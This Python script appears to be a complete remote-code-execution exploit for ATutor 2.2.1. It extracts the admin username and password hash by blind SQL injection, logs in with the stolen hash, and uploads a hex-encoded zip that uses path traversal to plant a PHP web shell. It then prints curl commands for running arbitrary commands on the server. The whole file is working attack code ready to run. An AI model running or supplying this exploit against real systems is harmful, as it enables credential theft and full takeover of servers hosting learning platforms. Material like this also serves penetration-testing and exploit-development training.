import requests, sys, hashlib, time, subprocess
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def find_char(url, inj_str):
    for j in range(32, 126):
            modified_inj_str = inj_str.replace("[CHAR]", str(j))
            target = f"{url}/ATutor/mods/_standard/social/index_public.php?q={modified_inj_str}"
            r = requests.get(target)
            content_length = int(r.headers['Content-Length'])
            if content_length > 20:
                return j
    return None

def auth_bypass(victim_admin, victim_admin_pass, url):
    print("[-] Generating Payload...")
    pt_payload = victim_admin_pass + "rs0nwuzhere"
    payload = hashlib.sha1(pt_payload.encode()).hexdigest()
    print("[-] Bypassing Authentication...")
    s = requests.Session()
    data = f"form_password_hidden={payload}&form_login={victim_admin}&token=rs0nwuzhere&submit=login"
    http_proxy  = "http://127.0.0.1:8080"
    https_proxy = "https://127.0.0.1:8080"
    proxy_dict = { 
            "http"  : http_proxy, 
            "https" : https_proxy, 
            }
    r = s.post(f"{url}/ATutor/login.php", data=data, headers={'Content-Type':'application/x-www-form-urlencoded',"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, proxies=proxy_dict, allow_redirects=True)
    soup = BeautifulSoup(r.text, 'html.parser')
    if "My Courses: My Start Page" in soup.title:
        print("[+] Login Successful!")
        return s
    else:
        print("[!] Something went wrong -- exiting...")
        sys.exit(2)

def file_upload(s, url):
    http_proxy  = "http://127.0.0.1:8080"
    https_proxy = "https://127.0.0.1:8080"
    proxy_dict = { 
            "http"  : http_proxy, 
            "https" : https_proxy, 
            }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://" + url + "/ATutor/mods/_standard/tests/import_test.php",
        "Connection": "close",
        "Content-Type": "multipart/form-data; boundary=---------------------------219891867818590547211552643076",
    }
    data = ""
    data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
    data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x32"
    data += "\x31\x39\x38\x39\x31\x38\x36\x37\x38\x31\x38\x35\x39\x30\x35"
    data += "\x34\x37\x32\x31\x31\x35\x35\x32\x36\x34\x33\x30\x37\x36\x0d"
    data += "\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44\x69\x73\x70\x6f\x73"
    data += "\x69\x74\x69\x6f\x6e\x3a\x20\x66\x6f\x72\x6d\x2d\x64\x61\x74"
    data += "\x61\x3b\x20\x6e\x61\x6d\x65\x3d\x22\x66\x69\x6c\x65\x22\x3b"
    data += "\x20\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d\x22\x70\x6f\x63\x2e"
    data += "\x7a\x69\x70\x22\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54"
    data += "\x79\x70\x65\x3a\x20\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f"
    data += "\x6e\x2f\x7a\x69\x70\x0d\x0a\x0d\x0a\x50\x4b\x03\x04\x14\x00"
    data += "\x00\x00\x08\x00\x37\x70\xb5\x52\x24\xf3\x98\x53\x54\x00\x00"
    data += "\x00\x71\x00\x00\x00\x2e\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f"
    data += "\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77\x77\x2f\x68"
    data += "\x74\x6d\x6c\x2f\x41\x54\x75\x74\x6f\x72\x2f\x6d\x6f\x64\x73"
    data += "\x2f\x70\x6f\x63\x2e\x70\x68\x74\x6d\x6c\xb3\xb1\x2f\xc8\x28"
    data += "\x50\xc8\x4c\xd3\xc8\x2c\x2e\x4e\x2d\xd1\x50\x89\x0f\x72\x0d"
    data += "\x0c\x75\x0d\x0e\x89\x56\x4f\xce\x4d\x51\x8f\xd5\xd4\xac\x56"
    data += "\x48\x4d\xce\xc8\x57\x50\xb2\x29\x28\x4a\xb5\x53\xb2\x56\x50"
    data += "\x01\x8a\x2b\xd8\x2a\x60\xaa\xb4\x56\x28\xae\x2c\x2e\x49\xcd"
    data += "\xd5\x00\xa9\x00\xf2\xa0\xda\xf4\xa1\xfa\x52\x32\x53\xad\x15"
    data += "\x6a\xed\xed\x00\x50\x4b\x03\x04\x14\x00\x00\x00\x08\x00\x37"
    data += "\x70\xb5\x52\xc3\x2b\x16\xa7\x13\x00\x00\x00\x13\x00\x00\x00"
    data += "\x0f\x00\x00\x00\x69\x6d\x73\x6d\x61\x6e\x69\x66\x65\x73\x74"
    data += "\x2e\x78\x6d\x6c\x0b\xc9\xc8\x2c\x56\x00\xa2\xc4\x3c\x85\x08"
    data += "\x5f\x1f\x85\xb4\xcc\x9c\x54\x00\x50\x4b\x01\x02\x14\x03\x14"
    data += "\x00\x00\x00\x08\x00\x37\x70\xb5\x52\x24\xf3\x98\x53\x54\x00"
    data += "\x00\x00\x71\x00\x00\x00\x2e\x00\x00\x00\x00\x00\x00\x00\x00"
    data += "\x00\x00\x00\x80\x01\x00\x00\x00\x00\x2e\x2e\x2f\x2e\x2e\x2f"
    data += "\x2e\x2e\x2f\x2e\x2e\x2f\x76\x61\x72\x2f\x77\x77\x77\x2f\x68"
    data += "\x74\x6d\x6c\x2f\x41\x54\x75\x74\x6f\x72\x2f\x6d\x6f\x64\x73"
    data += "\x2f\x70\x6f\x63\x2e\x70\x68\x74\x6d\x6c\x50\x4b\x01\x02\x14"
    data += "\x03\x14\x00\x00\x00\x08\x00\x37\x70\xb5\x52\xc3\x2b\x16\xa7"
    data += "\x13\x00\x00\x00\x13\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00"
    data += "\x00\x00\x00\x00\x00\x80\x01\xa0\x00\x00\x00\x69\x6d\x73\x6d"
    data += "\x61\x6e\x69\x66\x65\x73\x74\x2e\x78\x6d\x6c\x50\x4b\x05\x06"
    data += "\x00\x00\x00\x00\x02\x00\x02\x00\x99\x00\x00\x00\xe0\x00\x00"
    data += "\x00\x00\x00\x0d\x0a\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
    data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
    data += "\x2d\x2d\x2d\x2d\x32\x31\x39\x38\x39\x31\x38\x36\x37\x38\x31"
    data += "\x38\x35\x39\x30\x35\x34\x37\x32\x31\x31\x35\x35\x32\x36\x34"
    data += "\x33\x30\x37\x36\x0d\x0a\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x44"
    data += "\x69\x73\x70\x6f\x73\x69\x74\x69\x6f\x6e\x3a\x20\x66\x6f\x72"
    data += "\x6d\x2d\x64\x61\x74\x61\x3b\x20\x6e\x61\x6d\x65\x3d\x22\x73"
    data += "\x75\x62\x6d\x69\x74\x5f\x69\x6d\x70\x6f\x72\x74\x22\x0d\x0a"
    data += "\x0d\x0a\x49\x6d\x70\x6f\x72\x74\x0d\x0a\x2d\x2d\x2d\x2d\x2d"
    data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d"
    data += "\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x2d\x32\x31\x39\x38\x39\x31"
    data += "\x38\x36\x37\x38\x31\x38\x35\x39\x30\x35\x34\x37\x32\x31\x31"
    data += "\x35\x35\x32\x36\x34\x33\x30\x37\x36\x2d\x2d\x0d\x0a"

    print("[-] Delivering payload...")
    s.get(f"{url}/ATutor/bounce.php?course=16777215", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, allow_redirects=True)
    s.get(f"{url}/ATutor/mods/_standard/tests/my_tests.php", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, allow_redirects=True)
    s.get(f"{url}/ATutor/mods/_standard/tests/index.php", headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}, allow_redirects=True)
    r = s.post(f"{url}/ATutor/mods/_standard/tests/import_test.php", headers=headers, data=data, proxies=proxy_dict, allow_redirects=True)
    if "XML error: Not well-formed (invalid token) at line 1" in r.text:
        time.sleep(2)
        print("[+] Payload delivered successfully!")
    else:
        print("[!] Something went wrong -- exiting...")
        print(r.text)
        sys.exit(2)

def main():
    use_message = "[!] USAGE: python3 atutor_2.2.1-rce.py [ATUTOR_URL]\n[!] FORMAT: Url must include protocol at the beginning -- do not include / at the end\n[!] EXAMPLE: python3 atutor_2.2.1-rce.py http://atutor-server.com"
    if len(sys.argv) != 2:
        print(use_message)
        sys.exit(2)
    if sys.argv[1][:4] != "http":
        print(use_message)
        sys.exit(2)
    print("[+] Step 1: Blind SQL Injection")
    url = sys.argv[1]
    victim_admin = ""
    print("[-] Identifying user account with correct privileges...")
    print("[-] Exfiltrating victim's username...")
    for i in range(1, 1000):
        try: 
            inj_str = f"test')/**/or/**/(ascii(substring((select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1),{i},1)))=[CHAR]%23"
            exfiltrated_char = chr(find_char(url, inj_str))
            victim_admin += exfiltrated_char
            sys.stdout.write(exfiltrated_char)
            sys.stdout.flush()
        except:
            break
    print(f"\n[+] The victim's username is {victim_admin}.")
    victim_admin_pass = ""
    print("[-] Exfiltrating victim's hashed password...")
    for i in range(1, 1000):
        try: 
            inj_str = f"test')/**/or/**/(ascii(substring((select/**/password/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1),{i},1)))=[CHAR]%23"
            exfiltrated_char = chr(find_char(url, inj_str))
            victim_admin_pass += exfiltrated_char
            sys.stdout.write(exfiltrated_char)
            sys.stdout.flush()
        except:
            break
    print(f"\n[+] The victim's password is {victim_admin_pass}.")
    print("[+] Step 2: Authentication Bypass")
    session = auth_bypass(victim_admin, victim_admin_pass, url)
    print("[+] Step 3: Insecure File Upload")
    file_upload(session, url)
    print("[+] Step 4: Remote Code Execution")
    print("[-] Triggering RCE...")
    final = session.get(f"{url}/ATutor/mods/poc.phtml?cmd=echo%20RCE")
    if "RCE" in final.text:
        print("[+] Upload successful!")
        print("[+] Use the following command to execute code on the ATutor server:")
        print(f"     curl {url}/ATutor/mods/poc.phtml?cmd=[COMMAND]")
        print(f"     EX: curl {url}/ATutor/mods/poc.phtml?cmd=whoami")
    else:
        print("[!] Something went wrong -- exiting...")
        sys.exit(2)

if __name__ == "__main__":
    main()
